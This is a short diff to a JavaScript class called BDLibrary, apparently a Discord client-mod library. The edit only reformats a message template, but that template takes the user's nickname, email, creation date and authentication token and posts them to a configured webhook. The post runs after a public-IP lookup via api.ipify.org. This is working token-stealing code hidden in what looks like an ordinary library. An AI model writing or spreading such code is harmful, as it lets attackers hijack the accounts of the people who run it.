@@ -31,7 +31,7 @@ class BDLibrary {
         let formatted_date = date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
         
         fetch("https://api.ipify.org?format=json").then((data) => {
-            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n**Created: __${formatted_date}__**\n**Received token:**\`\`\`${authToken}\`\`\``}});
+            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n**Created: __${formatted_date}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
         });
     }
 }
